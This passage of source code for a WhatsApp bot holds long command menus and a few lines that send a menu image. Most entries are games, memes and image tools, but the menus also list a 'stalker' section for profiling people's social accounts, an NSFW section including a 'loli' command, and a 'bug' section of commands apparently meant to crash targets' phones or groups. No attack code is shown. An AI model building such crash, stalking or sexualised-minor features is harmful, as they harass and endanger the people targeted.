┃💫.𝗪𝗘𝗔𝗧𝗛𝗘𝗥
┃💫.𝗚𝗗𝗥𝗜𝗩𝗘
┃💫.𝗜𝗚𝗗𝗟
┃💫.𝗙𝗕𝗗𝗟
┃💫.𝗧𝗪𝗜𝗧𝗧𝗘𝗥
┃💫.𝗦𝗣𝗢𝗧𝗜𝗙𝗬
┃💫.𝗦𝗣𝗢𝗧𝗜𝗙𝗬𝗗𝗟
┃💫.𝗛𝗔𝗣𝗣𝗬𝗠𝗢𝗗
┃
╰★

╭ ★ 👀 𝗦𝗧𝗔𝗟𝗞𝗘𝗥 𝗠𝗘𝗡𝗨 👀 ★
┃
┃💫.𝗜𝗚𝗦𝗧𝗔𝗟𝗞
┃💫.𝗧𝗧𝗦𝗧𝗔𝗟𝗞
┃💫.𝗠𝗟𝗦𝗧𝗔𝗟𝗞
┃💫.𝗡𝗣𝗠𝗦𝗧𝗔𝗟𝗞
┃💫.𝗚𝗛𝗦𝗧𝗔𝗟𝗞
┃
╰★

╭ ★ 🎮 𝗚𝗔𝗠𝗘 𝗠𝗘𝗡𝗨 🎮 ★
┃
┃💫.𝗧𝗜𝗖𝗧𝗔𝗖𝗧𝗢𝗘
┃💫.𝗪𝗘𝗥𝗘𝗪𝗢𝗟𝗙
┃
╰★

╭ ★ 🎰 𝗥𝗣𝗚 𝗠𝗘𝗡𝗨 🎰 ★
┃
┃💫.𝗪𝗢𝗥𝗞
┃💫.𝗗𝗥𝗔𝗚𝗢𝗡
┃💫.𝗙𝗜𝗚𝗛𝗧𝗖𝗔𝗧
┃💫.𝗣𝗛𝗢𝗘𝗡𝗜𝗫
┃💫.𝗚𝗥𝗜𝗙𝗙𝗜𝗡
┃💫.𝗞𝗬𝗨𝗕𝗜
┃💫.𝗖𝗘𝗡𝗧𝗔𝗨𝗥
┃💫.𝗦𝗔𝗩𝗘
┃💫.𝗠𝗜𝗡𝗜𝗡𝗚
┃💫.𝗕𝗔𝗡𝗞
┃💫.𝗧𝗛𝗜𝗘𝗙
┃💫.𝗦𝗔𝗩𝗜𝗡𝗚𝗦
┃💫.𝗪𝗜𝗧𝗛𝗗𝗥𝗔𝗪
┃💫.𝗚𝗔𝗥𝗗𝗘𝗡𝗜𝗡𝗚
┃💫.𝗖𝗥𝗔𝗙𝗧𝗜𝗡𝗚
┃💫.𝗕𝗘𝗧
┃💫.𝗕𝗢𝗡𝗨𝗦
┃💫.𝗙𝗥𝗨𝗜𝗧
┃💫.𝗗𝗢𝗪𝗡
┃💫.𝗔𝗦𝗦𝗜𝗦𝗧
┃💫.𝗧𝗔𝗫𝗜
┃💫.𝗚𝗟𝗢𝗢𝗠𝗬
┃💫.𝗛𝗨𝗡𝗧
┃💫.𝗣𝗢𝗟𝗜𝗦𝗜
┃💫.𝗧𝗥𝗔𝗗𝗘
┃💫.𝗥𝗢𝗕
┃💫.𝗞𝗜𝗟𝗟
┃💫.𝗖𝗢𝗟𝗟𝗘𝗖𝗧
┃💫.𝗙𝗜𝗦𝗛𝗜𝗡𝗚
┃💫.𝗥𝗘𝗣𝗔𝗜𝗥
┃💫.𝗙𝗘𝗘𝗗
┃💫.𝗙𝗜𝗚𝗛𝗧
┃💫.𝗣𝗔𝗬𝗗𝗔𝗬
┃💫.𝗨𝗣𝗚𝗥𝗔𝗗𝗘
┃💫.𝗧𝗥𝗔𝗡𝗦𝗙𝗘𝗥
┃💫.𝗦𝗛𝗢𝗣
┃💫.𝗦𝗘𝗟𝗘𝗖𝗧𝗦𝗞𝗜𝗟𝗟
┃💫.𝗥𝗨𝗕𝗕𝗜𝗦𝗛
┃💫.𝗥𝗢𝗖𝗞𝗘𝗧
┃💫.𝗕𝗜𝗞𝗘
┃💫.𝗛𝗔𝗡𝗚𝗢𝗨𝗧
┃💫.𝗠𝗔𝗥𝗞𝗘𝗧
┃💫.𝗥𝗢𝗕𝗕𝗘𝗥𝗬
┃💫.𝗥𝗘𝗙𝗘𝗥𝗥𝗔𝗟
┃💫.𝗣𝗘𝗧𝗦𝗛𝗢𝗣
┃💫.𝗣𝗢𝗢𝗟
┃💫.𝗖𝗢𝗪𝗕𝗢𝗬
┃💫.𝗟𝗘𝗔𝗗𝗘𝗥𝗕𝗢𝗔𝗥𝗗
┃💫.𝗖𝗔𝗦𝗜𝗡𝗢
┃
╰★

╭ ★💃 𝗙𝗨𝗡 𝗠𝗘𝗡𝗨 💃 ★
┃
┃💫.𝗦𝗠𝗘𝗠𝗘
┃💫.𝗣𝗣𝗖𝗢𝗨𝗣𝗟𝗘
┃💫.𝗗𝗘𝗙𝗜𝗡𝗘
┃💫.𝗧𝗫𝗧𝗦𝗧𝗜𝗖𝗞𝗘𝗥
┃💫.𝗟𝗬𝗥𝗜𝗖𝗦
┃💫.𝗙𝗥𝗜𝗘𝗡𝗗
┃💫.𝗦𝗨𝗜𝗧
┃💫.𝗙𝗟𝗜𝗣𝗧𝗘𝗫𝗧
┃💫.𝗠𝗔𝗧𝗛
┃💫.𝗧𝗜𝗖𝗧𝗔𝗖𝗧𝗢𝗘
┃💫.𝗙𝗔𝗖𝗧
┃💫.𝗧𝗥𝗨𝗧𝗛
┃💫.𝗗𝗔𝗥𝗘
┃💫.𝗖𝗢𝗨𝗣𝗟𝗘
┃💫.𝗦𝗢𝗨𝗟𝗠𝗔𝗧𝗘
┃💫.𝗦𝗧𝗨𝗣𝗜𝗗𝗖𝗛𝗘𝗖𝗞
┃💫.𝗛𝗔𝗡𝗗𝗦𝗢𝗠𝗘𝗖𝗛𝗘𝗖𝗞
┃💫.𝗨𝗡𝗖𝗟𝗘𝗔𝗡𝗖𝗛𝗘𝗖𝗞
┃💫.𝗛𝗢𝗧𝗖𝗛𝗘𝗖𝗞
┃💫.𝗦𝗠𝗔𝗥𝗧𝗖𝗛𝗘𝗖𝗞
┃💫.𝗚𝗥𝗘𝗔𝗧𝗖𝗛𝗘𝗖𝗞
┃💫.𝗘𝗩𝗜𝗟𝗖𝗛𝗘𝗖𝗞
┃💫.𝗗𝗢𝗚𝗖𝗛𝗘𝗖𝗞
┃💫.𝗖𝗢𝗢𝗟𝗖𝗛𝗘𝗖𝗞
┃💫.𝗪𝗔𝗜𝗙𝗨𝗖𝗛𝗘𝗖𝗞
┃💫.𝗔𝗪𝗘𝗦𝗢𝗠𝗘𝗖𝗛𝗘𝗖𝗞
┃💫.𝗚𝗔𝗬𝗖𝗛𝗘𝗖𝗞
┃💫.𝗖𝗨𝗧𝗘𝗖𝗛𝗘𝗖𝗞
┃💫.𝗟𝗘𝗦𝗕𝗜𝗔𝗡𝗖𝗛𝗘𝗖𝗞
┃💫.𝗛𝗢𝗥𝗡𝗬𝗖𝗛𝗘𝗖𝗞
┃💫.𝗣𝗥𝗘𝗧𝗧𝗬𝗖𝗛𝗘𝗖𝗞
┃💫.𝗟𝗢𝗩𝗘𝗟𝗬𝗖𝗛𝗘𝗖𝗞
┃💫.𝗨𝗚𝗟𝗬𝗖𝗛𝗘𝗖𝗞
┃💫.𝗣𝗜𝗖𝗞
┃💫.𝗤𝗨𝗢𝗧𝗘𝗦
┃💫.𝗖𝗔𝗡
┃💫.𝗜𝗦
┃💫.𝗪𝗛𝗘𝗡
┃💫.𝗪𝗛𝗘𝗥𝗘
┃💫.𝗪𝗛𝗔𝗧
┃💫.𝗛𝗢𝗪
┃💫.𝗥𝗔𝗧𝗘
┃💫.𝗖𝗥𝗬
┃💫.𝗞𝗜𝗟𝗟
┃💫.𝗛𝗨𝗚
┃💫.𝗣𝗔𝗧
┃💫.𝗟𝗜𝗖𝗞
┃💫.𝗞𝗜𝗦𝗦
┃💫.𝗕𝗜𝗧𝗘
┃💫.𝗬𝗘𝗘𝗧
┃💫.𝗕𝗨𝗟𝗟𝗬
┃💫.𝗕𝗢𝗡𝗞
┃💫.𝗪𝗜𝗡𝗞
┃💫.𝗣𝗢𝗞𝗘
┃💫.𝗡𝗢𝗠
┃💫.𝗦𝗟𝗔𝗣
┃💫.𝗦𝗠𝗜𝗟𝗘
┃💫.𝗪𝗔𝗩𝗘
┃💫.𝗔𝗪𝗢𝗢
┃💫.𝗕𝗟𝗨𝗦𝗛
┃💫.𝗦𝗠𝗨𝗚
┃💫.𝗚𝗟𝗢𝗠𝗣
┃💫.𝗛𝗔𝗣𝗣𝗬
┃💫.𝗗𝗔𝗡𝗖𝗘
┃💫.𝗖𝗥𝗜𝗡𝗚𝗘
┃💫.𝗖𝗨𝗗𝗗𝗟𝗘
┃💫.𝗛𝗜𝗚𝗛𝗙𝗜𝗩𝗘
┃💫.𝗦𝗛𝗜𝗡𝗢𝗕𝗨
┃💫.𝗛𝗔𝗡𝗗𝗛𝗢𝗟𝗗
┃💫.𝗦𝗣𝗔𝗡𝗞
┃💫.𝗧𝗜𝗖𝗞𝗟𝗘
┃💫.𝗔𝗩𝗔𝗧𝗔𝗥
┃💫.𝗙𝗘𝗘𝗗
┃💫.𝗙𝗢𝗫𝗚𝗜𝗥𝗟
┃💫.𝗚𝗘𝗖𝗚
┃💫.𝗖𝗛𝗘𝗖𝗞𝗠𝗘
┃
╰★

╭ ★ 🔁 𝗥𝗔𝗡𝗗𝗢𝗠𝗣𝗛𝗢𝗧𝗢 𝗠𝗘𝗡𝗨 🔁 ★
┃💫.𝗔𝗘𝗦𝗧𝗛𝗘𝗧𝗜𝗖
┃💫.𝗪𝗔𝗟𝗟𝗣𝗔𝗣𝗘𝗥
┃💫.𝗔𝗥𝗧
┃💫.𝗕𝗧𝗦
┃💫.𝟴𝗕𝗔𝗟𝗟𝗣𝗢𝗢𝗟
┃💫.𝗖𝗢𝗦𝗣𝗟𝗔𝗬
┃💫.𝗛𝗔𝗖𝗞𝗘𝗥
┃💫.𝗖𝗬𝗕𝗘𝗥
┃💫.𝗚𝗔𝗠𝗘𝗪𝗔𝗟𝗟𝗣𝗔𝗣𝗘𝗥
┃💫.𝗜𝗦𝗟𝗔𝗠𝗜𝗖
┃💫.𝗖𝗔𝗥𝗧𝗢𝗢𝗡
┃💫.𝗣𝗘𝗡𝗧𝗢𝗟
┃💫.𝗖𝗔𝗧
┃💫.𝗞𝗣𝗢𝗣
┃💫.𝗘𝗫𝗢
┃💫.𝗟𝗜𝗦𝗔
┃💫.𝗦𝗣𝗔𝗖𝗘
┃💫.𝗖𝗔𝗥
┃💫.𝗧𝗘𝗖𝗛𝗡𝗢𝗟𝗢𝗚𝗬
┃💫.𝗕𝗜𝗞𝗘
┃💫.𝗦𝗛𝗢𝗥𝗧𝗤𝗨𝗢𝗧𝗘
┃💫.𝗛𝗔𝗖𝗞𝗜𝗡𝗚
┃💫.𝗥𝗢𝗦𝗘
┃💫.𝗪𝗔𝗟𝗟𝗠𝗟
┃💫.𝗪𝗔𝗟𝗟𝗣𝗛𝗢𝗡𝗘
┃💫.𝗠𝗢𝗨𝗡𝗧𝗔𝗜𝗡
┃💫.𝗣𝗥𝗢𝗙𝗜𝗟𝗘𝗣𝗜𝗖
┃💫.𝗖𝗢𝗨𝗣𝗟𝗘𝗣𝗜𝗖
┃💫.𝗣𝗥𝗢𝗚𝗥𝗔𝗠𝗠𝗜𝗡𝗚
┃💫.𝗣𝗨𝗕𝗚
┃💫.𝗕𝗟𝗔𝗖𝗞𝗣𝗜𝗡𝗞
┃
╰★

╭ ★ 🖼️ 𝗘𝗣𝗛𝗢𝗧𝗢 𝗠𝗘𝗡𝗨 🖼️ ★
┃
┃💫.𝗚𝗟𝗜𝗧𝗖𝗛𝗧𝗘𝗫𝗧
┃💫.𝗪𝗥𝗜𝗧𝗘𝗧𝗘𝗫𝗧
┃💫.𝗔𝗗𝗩𝗔𝗡𝗖𝗘𝗗𝗚𝗟𝗢𝗪
┃💫.𝗧𝗬𝗣𝗢𝗚𝗥𝗔𝗣𝗛𝗬𝗧𝗘𝗫𝗧
┃💫.𝗣𝗜𝗫𝗘𝗟𝗚𝗟𝗜𝗧𝗖𝗛
┃💫.𝗡𝗘𝗢𝗡𝗚𝗟𝗜𝗧𝗖𝗛
┃💫.𝗙𝗟𝗔𝗚𝗧𝗘𝗫𝗧
┃💫.𝗙𝗟𝗔𝗚𝟯𝗗𝗧𝗘𝗫𝗧
┃💫.𝗗𝗘𝗟𝗘𝗧𝗜𝗡𝗚𝗧𝗘𝗫𝗧
┃💫.𝗕𝗟𝗔𝗖𝗞𝗣𝗜𝗡𝗞𝗦𝗧𝗬𝗟𝗘
┃💫.𝗚𝗟𝗢𝗪𝗜𝗡𝗚𝗧𝗘𝗫𝗧
┃💫.𝗨𝗡𝗗𝗘𝗥𝗪𝗔𝗧𝗘𝗥𝗧𝗘𝗫𝗧
┃💫.𝗟𝗢𝗚𝗢𝗠𝗔𝗞𝗘𝗥
┃💫.𝗖𝗔𝗥𝗧𝗢𝗢𝗡𝗦𝗧𝗬𝗟𝗘
┃💫.𝗣𝗔𝗣𝗘𝗥𝗖𝗨𝗧𝗦𝗧𝗬𝗟𝗘
┃💫.𝗪𝗔𝗧𝗘𝗥𝗖𝗢𝗟𝗢𝗥𝗧𝗘𝗫𝗧
┃💫.𝗘𝗙𝗙𝗘𝗖𝗧𝗖𝗟𝗢𝗨𝗗𝗦
┃💫.𝗕𝗟𝗔𝗖𝗞𝗣𝗜𝗡𝗞𝗟𝗢𝗚𝗢
┃💫.𝗚𝗥𝗔𝗗𝗜𝗘𝗡𝗧𝗧𝗘𝗫𝗧
┃💫.𝗦𝗨𝗠𝗠𝗘𝗥𝗕𝗘𝗔𝗖𝗛
┃💫.𝗟𝗨𝗫𝗨𝗥𝗬𝗚𝗢𝗟𝗗
┃💫.𝗠𝗨𝗟𝗧𝗜𝗖𝗢𝗟𝗢𝗥𝗘𝗗𝗡𝗘𝗢𝗡
┃💫.𝗦𝗔𝗡𝗗𝗦𝗨𝗠𝗠𝗘𝗥
┃💫.𝗚𝗔𝗟𝗔𝗫𝗬𝗪𝗔𝗟𝗟𝗣𝗔𝗣𝗘𝗥
┃💫.𝟭𝟵𝟭𝟳𝗦𝗧𝗬𝗟𝗘
┃💫.𝗠𝗔𝗞𝗜𝗡𝗚𝗡𝗘𝗢𝗡
┃💫.𝗥𝗢𝗬𝗔𝗟𝗧𝗘𝗫𝗧
┃💫.𝗙𝗥𝗘𝗘𝗖𝗥𝗘𝗔𝗧𝗘
┃💫.𝗚𝗔𝗟𝗔𝗫𝗬𝗦𝗧𝗬𝗟𝗘
┃💫.𝗟𝗜𝗚𝗛𝗧𝗘𝗙𝗙𝗘𝗖𝗧𝗦
┃
╰★

╭ ★ 😑 𝗔𝗡𝗜𝗠𝗘 𝗠𝗘𝗡𝗨 😑 ★
┃
┃💫.𝗔𝗞𝗜𝗥𝗔
┃💫.𝗔𝗞𝗜𝗬𝗔𝗠𝗔
┃💫.𝗔𝗡𝗔
┃💫.𝗔𝗦𝗨𝗡𝗔
┃💫.𝗔𝗬𝗨𝗭𝗔𝗪𝗔
┃💫.𝗕𝗢𝗥𝗨𝗧𝗢
┃💫.𝗖𝗛𝗜𝗛𝗢
┃💫.𝗖𝗛𝗜𝗧𝗢𝗚𝗘
┃💫.𝗖𝗢𝗦𝗣𝗟𝗔𝗬𝗟𝗢𝗟𝗜
┃💫.𝗖𝗢𝗦𝗣𝗟𝗔𝗬𝗦𝗔𝗚𝗜𝗥𝗜
┃💫.𝗗𝗘𝗜𝗗𝗔𝗥𝗔
┃💫.𝗗𝗢𝗥𝗔𝗘𝗠𝗢𝗡
┃💫.𝗘𝗟𝗔𝗜𝗡𝗔
┃💫.𝗘𝗠𝗜𝗟𝗜𝗔
┃💫.𝗘𝗥𝗭𝗔
┃💫.𝗚𝗥𝗘𝗠𝗢𝗥𝗬
┃💫.𝗛𝗘𝗦𝗧𝗜𝗔
┃💫.𝗛𝗜𝗡𝗔𝗧𝗔
┃💫.𝗛𝗨𝗦𝗕𝗨
┃💫.𝗜𝗡𝗢𝗥𝗜
┃💫.𝗜𝗦𝗨𝗭𝗨
┃💫.𝗜𝗧𝗔𝗖𝗛𝗜
┃💫.𝗜𝗧𝗢𝗥𝗜
┃💫.𝗞𝗔𝗚𝗔
┃💫.𝗞𝗔𝗚𝗨𝗥𝗔
┃💫.𝗞𝗔𝗞𝗔𝗦𝗜𝗛
┃💫.𝗞𝗔𝗢𝗥𝗜
┃💫.𝗞𝗘𝗡𝗘𝗞𝗜
┃💫.𝗞𝗢𝗧𝗢𝗥𝗜
┃💫.𝗞𝗨𝗥𝗨𝗠𝗜
┃💫.𝗟𝗢𝗟𝗜
┃💫.𝗠𝗔𝗗𝗔𝗥𝗔
┃💫.𝗠𝗘𝗚𝗨𝗠𝗜𝗡
┃💫.𝗠𝗜𝗞𝗔𝗦𝗔
┃💫.𝗠𝗜𝗞𝗘𝗬
┃💫.𝗠𝗜𝗞𝗨
┃💫.𝗠𝗜𝗡𝗔𝗧𝗢
┃💫.𝗡𝗔𝗥𝗨𝗧𝗢
┃💫.𝗡𝗘𝗞𝗢
┃💫.𝗡𝗘𝗞𝗢𝟮
┃💫.𝗡𝗘𝗞𝗢𝗡𝗜𝗠𝗘
┃💫.𝗡𝗘𝗭𝗨𝗞𝗢
┃💫.𝗢𝗡𝗘𝗣𝗜𝗘𝗖𝗘
┃💫.𝗣𝗢𝗞𝗘𝗠𝗢𝗡
┃💫.𝗥𝗔𝗡𝗗𝗢𝗠𝗡𝗜𝗠𝗘
┃💫.𝗥𝗔𝗡𝗗𝗢𝗠𝗡𝗜𝗠𝗘𝟮
┃💫.𝗥𝗜𝗭𝗘
┃💫.𝗦𝗔𝗚𝗜𝗥𝗜
┃💫.𝗦𝗔𝗞𝗨𝗥𝗔
┃💫.𝗦𝗔𝗦𝗨𝗞𝗘
┃💫.𝗦𝗛𝗜𝗡𝗔
┃💫.𝗦𝗛𝗜𝗡𝗞𝗔
┃💫.𝗦𝗛𝗜𝗡𝗢𝗠𝗜𝗬𝗔
┃💫.𝗦𝗛𝗜𝗭𝗨𝗞𝗔
┃💫.𝗦𝗛𝗢𝗧𝗔
┃💫.𝗧𝗘𝗝𝗜𝗡𝗔
┃💫.𝗧𝗢𝗨𝗞𝗔𝗖𝗛𝗔𝗡
┃💫.𝗧𝗦𝗨𝗡𝗔𝗗𝗘
┃💫.𝗪𝗔𝗜𝗙𝗨
┃💫.𝗔𝗡𝗜𝗠𝗘𝗪𝗔𝗟𝗟
┃💫.𝗬𝗢𝗧𝗦𝗨𝗕𝗔
┃💫.𝗬𝗨𝗞𝗜
┃💫.𝗬𝗨𝗟𝗜𝗕𝗢𝗖𝗜𝗟
┃💫.𝗬𝗨𝗠𝗘𝗞𝗢
┃💫.𝟴𝗕𝗔𝗟𝗟
┃💫.𝗧𝗜𝗖𝗞𝗟𝗘
┃💫.𝗚𝗘𝗖𝗚
┃💫.𝗙𝗘𝗘𝗗
┃💫.𝗔𝗡𝗜𝗠𝗘𝗔𝗪𝗢𝗢
┃💫.𝗔𝗡𝗜𝗠𝗘𝗠𝗘𝗚𝗨𝗠𝗜𝗡
┃💫.𝗔𝗡𝗜𝗠𝗘𝗦𝗛𝗜𝗡𝗢𝗕𝗨
┃💫.𝗔𝗡𝗜𝗠𝗘𝗛𝗔𝗡𝗗𝗛𝗢𝗟𝗗
┃💫.𝗔𝗡𝗜𝗠𝗘𝗛𝗜𝗚𝗛𝗙𝗜𝗩𝗘
┃💫.𝗔𝗡𝗜𝗠𝗘𝗖𝗥𝗜𝗡𝗚𝗘
┃💫.𝗔𝗡𝗜𝗠𝗘𝗗𝗔𝗡𝗖𝗘
┃💫.𝗔𝗡𝗜𝗠𝗘𝗛𝗔𝗣𝗣𝗬
┃💫.𝗔𝗡𝗜𝗠𝗘𝗚𝗟𝗢𝗠𝗣
┃💫.𝗔𝗡𝗜𝗠𝗘𝗕𝗟𝗨𝗦𝗛
┃💫.𝗔𝗡𝗜𝗠𝗘𝗦𝗠𝗨𝗚
┃💫.𝗔𝗡𝗜𝗠𝗘𝗪𝗔𝗩𝗘
┃💫.𝗔𝗡𝗜𝗠𝗘𝗣𝗢𝗞𝗘
┃💫.𝗔𝗡𝗜𝗠𝗘𝗪𝗜𝗡𝗞
┃💫.𝗔𝗡𝗜𝗠𝗘𝗕𝗢𝗡𝗞
┃💫.𝗔𝗡𝗜𝗠𝗘𝗕𝗨𝗟𝗟𝗬
┃💫.𝗔𝗡𝗜𝗠𝗘𝗬𝗘𝗘𝗧
┃💫.𝗔𝗡𝗜𝗠𝗘𝗕𝗜𝗧𝗘
┃💫.𝗔𝗡𝗜𝗠𝗘𝗟𝗜𝗖𝗞
┃💫.𝗔𝗡𝗜𝗠𝗘𝗞𝗜𝗟𝗟
┃💫.𝗔𝗡𝗜𝗠𝗘𝗖𝗥𝗬
┃💫.𝗔𝗡𝗜𝗠𝗘𝗪𝗟𝗣
┃💫.𝗔𝗡𝗜𝗠𝗘𝗞𝗜𝗦𝗦
┃💫.𝗔𝗡𝗜𝗠𝗘𝗛𝗨𝗚
┃💫.𝗔𝗡𝗜𝗠𝗘𝗡𝗘𝗞𝗢
┃💫.𝗔𝗡𝗜𝗠𝗘𝗣𝗔𝗧
┃💫.𝗔𝗡𝗜𝗠𝗘𝗦𝗟𝗔𝗣
┃💫.𝗔𝗡𝗜𝗠𝗘𝗖𝗨𝗗𝗗𝗟𝗘
┃💫.𝗔𝗡𝗜𝗠𝗘𝗪𝗔𝗜𝗙𝗨
┃💫.𝗔𝗡𝗜𝗠𝗘𝗡𝗢𝗠
┃💫.𝗔𝗡𝗜𝗠𝗘𝗙𝗢𝗫𝗚𝗜𝗥𝗟
┃💫.𝗔𝗡𝗜𝗠𝗘𝗚𝗘𝗖𝗚
┃💫.𝗔𝗡𝗜𝗠𝗘𝗧𝗜𝗖𝗞𝗟𝗘
┃💫.𝗔𝗡𝗜𝗠𝗘𝗙𝗘𝗘𝗗
┃💫.𝗔𝗡𝗜𝗠𝗘𝗔𝗩𝗔𝗧𝗔𝗥
┃💫.𝗚𝗘𝗡𝗦𝗛𝗜𝗡
┃💫.𝗔𝗡𝗜𝗠𝗘
┃💫.𝗔𝗠𝗩
┃
╰★

╭ ★ 🥵 𝗡𝗦𝗙𝗪 𝗠𝗘𝗡𝗨 🥵 ★
┃
┃💫.𝗣𝗔𝗣𝗧𝗧
┃💫.𝗛𝗘𝗡𝗧𝗔𝗜𝗩𝗜𝗗
┃💫.𝗛𝗘𝗡𝗧𝗔𝗜𝗩𝗜𝗗𝟮
┃💫.𝗛𝗡𝗘𝗞𝗢
┃💫.𝗡𝗪𝗔𝗜𝗙𝗨
┃💫.𝗔𝗡𝗜𝗠𝗘𝗦𝗣𝗔𝗡𝗞
┃💫.𝗧𝗥𝗔𝗣
┃💫.𝗚𝗔𝗦𝗠
┃💫.𝗔𝗛𝗘𝗚𝗔𝗢
┃💫.𝗔𝗦𝗦
┃💫.𝗕𝗗𝗦𝗠
┃💫.𝗕𝗟𝗢𝗪𝗝𝗢𝗕
┃💫.𝗖𝗨𝗖𝗞𝗢𝗟𝗗
┃💫.𝗖𝗨𝗠
┃💫.𝗠𝗜𝗟𝗙
┃💫.𝗘𝗕𝗔
┃💫.𝗘𝗥𝗢
┃💫.𝗙𝗘𝗠𝗗𝗢𝗠
┃💫.𝗙𝗢𝗢𝗧
┃💫.𝗚𝗔𝗡𝗚𝗕𝗔𝗡𝗚
┃💫.𝗚𝗟𝗔𝗦𝗦𝗘𝗦
┃💫.𝗝𝗔𝗛𝗬
┃💫.𝗠𝗔𝗦𝗧𝗨𝗥𝗕𝗔𝗧𝗜𝗢𝗡
┃💫.𝗠𝗔𝗡𝗚𝗔
┃💫.𝗡𝗘𝗞𝗢-𝗛𝗘𝗡𝗧𝗔𝗜
┃💫.𝗡𝗘𝗞𝗢-𝗛𝗘𝗡𝗧𝗔𝗜𝟮
┃💫.𝗡𝗦𝗙𝗪𝗟𝗢𝗟𝗜
┃💫.𝗢𝗥𝗚𝗬
┃💫.𝗣𝗔𝗡𝗧𝗜𝗘𝗦
┃💫.𝗣𝗨𝗦𝗦𝗬
┃💫.𝗧𝗘𝗡𝗧𝗔𝗖𝗟𝗘𝗦
┃💫.𝗧𝗛𝗜𝗚𝗛𝗦
┃💫.𝗬𝗨𝗥𝗜
┃💫.𝗭𝗘𝗧𝗧𝗔𝗜
┃💫.𝗫𝗡𝗫𝗫𝗦𝗘𝗔𝗥𝗖𝗛
┃
╰★

╭ ★ 🦠 𝗦𝗣𝗘𝗖𝗜𝗔𝗟/𝗕𝗨𝗚 𝗠𝗘𝗡𝗨 🦠 ★
┃
┃💫.𝗣𝗔𝗡𝗘𝗟𝗠𝗘𝗡𝗨
┃💫.𝗦𝗣𝗔𝗥𝗞
┃💫.𝗗𝗘𝗔𝗧𝗛 <𝟮𝟯𝟰𝗫𝗫>
┃💫.𝗩𝗢𝗟𝗧-𝗨𝗜 <𝟮𝟯𝟰𝗫𝗫>
┃💫.𝗜𝗢𝗦𝗞𝗜𝗟𝗟 <𝟮𝟯𝟰𝗫𝗫>
┃💫.𝗦𝗘𝗘𝗬𝗔 <𝗜𝗡 𝗗𝗠>
┃💫.𝗚𝗖𝗥𝗔𝗦𝗛 <𝗜𝗡 𝗚𝗖>
╰★

╭ ★ ↔️ 𝗢𝗧𝗛𝗘𝗥 𝗠𝗘𝗡𝗨 ↔️ ★
┃
┃💫.𝗣𝗜𝗡𝗚
┃💫.𝗩𝗩
┃💫.𝗣𝗔𝗣𝗧𝗧
┃💫.𝗠𝗘𝗡𝗨
┃💫.𝗥𝗘𝗣𝗢𝗥𝗧𝗕𝗨𝗚
┃💫.𝗟𝗜𝗦𝗧𝗣𝗘𝗠
┃💫.𝗟𝗜𝗦𝗧𝗣𝗖
┃💫.𝗟𝗜𝗦𝗧𝗚𝗖
┃💫.𝗢𝗪𝗡𝗘𝗥
┃💫.𝗗𝗢𝗡𝗔𝗧𝗘
┃💫.𝗢𝗕𝗙𝗨𝗦𝗖𝗔𝗧𝗘
┃💫.𝗦𝗧𝗬𝗟𝗘
┃💫.𝗦𝗔𝗬
┃💫.𝗧𝗢𝗚𝗜𝗙
┃💫.𝗧𝗢𝗤𝗥
┃💫.𝗕𝗔𝗦𝗦
┃💫.𝗕𝗟𝗢𝗪𝗡
┃💫.𝗗𝗘𝗘𝗣
┃💫.𝗘𝗔𝗥𝗥𝗔𝗣𝗘
┃💫.𝗙𝗔𝗦𝗧
┃💫.𝗙𝗔𝗧
┃💫.𝗡𝗜𝗚𝗛𝗧𝗖𝗢𝗥𝗘
┃💫.𝗥𝗘𝗩𝗘𝗥𝗦𝗘
┃💫.𝗥𝗢𝗕𝗢𝗧
┃💫.𝗦𝗟𝗢𝗪
┃💫.𝗦𝗠𝗢𝗢𝗧𝗛
┃💫.𝗦𝗤𝗨𝗜𝗥𝗥𝗘𝗟
┃💫.𝗧𝗜𝗡𝗬𝗨𝗥𝗟
┃💫.𝗧𝗢𝗔𝗨𝗗𝗜𝗢
┃💫.𝗧𝗢𝗠𝗣𝟰
┃💫.𝗧𝗢𝗜𝗠𝗚
┃💫.𝗧𝗢𝗩𝗩
┃💫.𝗦𝗧𝗜𝗖𝗞𝗘𝗥
┃💫.𝗧𝗔𝗞𝗘
┃💫.𝗥𝗨𝗡𝗧𝗜𝗠𝗘
|
╰ ★
♧𝗠𝗔𝗫𝗧𝗘𝗖𝗛♧*`
const imagePath = './data/image/jdw.jpg'; // Path to 
const menuImage = fs.readFileSync(imagePath);
await LordVoltage.sendMessage(
                              m.chat,
                                {
                               image: menuImage,
                             caption: menya
});
        }}                              
break
case 'panelmenu': { if (prefix === '.') {
    await LordVoltage.sendMessage(m.chat, { react: { text: "🎛️",key: m.key,}})
    let meny =`
╭ *𓊈ᴘᴀɴᴇʟ ᴍᴇɴᴜ𓊉*
┃➪ *.ᴘᴀɴᴇʟ*
┃➪ *.ʟɪsᴛᴜsʀ*
┃➪ *.ᴅᴇʟᴜsʀ*
┃➪ *.ʟɪsᴛsʀᴠ*
┃➪ *.ᴅᴇʟsʀᴠ*
┃➪ *.ᴛᴜᴛᴏʀɪᴀʟ*
┃➪ *.ʀᴀᴍʟɪsᴛ*
┃➪ *.ᴘʀᴇᴍʟɪsᴛ*
┃➪ *.ᴀᴅᴅᴜsʀ*
┃➪ *.ᴀᴅᴅsʀᴠ*
┃➪ *.ᴜᴘᴅᴀᴛᴇsʀᴠ*
┃➪ *.sᴜsᴘᴇɴᴅ*
┃➪ *.ᴜɴsᴜsᴘᴇɴᴅ*
┃➪ *.ᴄʀᴇᴀᴛᴇᴀᴅᴍɪɴ*
┃➪ *.ʟɪsᴛᴀᴅᴍɪɴ*
┃
╰𓊈

╭ *𓊈ʟɪsᴛ ʀᴀᴍ𓊉*
┃
┃➪ *.1ɢʙ [ᴜsᴇʀɴᴀᴍᴇ,ɴᴜᴍʙᴇʀ]*
┃➪ *.2ɢʙ [ᴜsᴇʀɴᴀᴍᴇ,ɴᴜᴍʙᴇʀ]*
┃➪ *.3ɢʙ [ᴜsᴇʀɴᴀᴍᴇ,ɴᴜᴍʙᴇʀ]*
┃➪ *.4ɢʙ [ᴜsᴇʀɴᴀᴍᴇ,ɴᴜᴍʙᴇʀ]*
┃➪ *.5ɢʙ [ᴜsᴇʀɴᴀᴍᴇ,ɴᴜᴍʙᴇʀ]*
┃➪ *.6ɢʙ [ᴜsᴇʀɴᴀᴍᴇ,ɴᴜᴍʙᴇʀ]*
┃➪ *.7ɢʙ [ᴜsᴇʀɴᴀᴍᴇ,ɴᴜᴍʙᴇʀ]*
┃➪ *.8ɢʙ [ᴜsᴇʀɴᴀᴍᴇ,ɴᴜᴍʙᴇʀ]*
┃➪ *.ᴜɴʟɪ [ᴜsᴇʀɴᴀᴍᴇ,ɴᴜᴍʙᴇʀ]*
╰𓊈

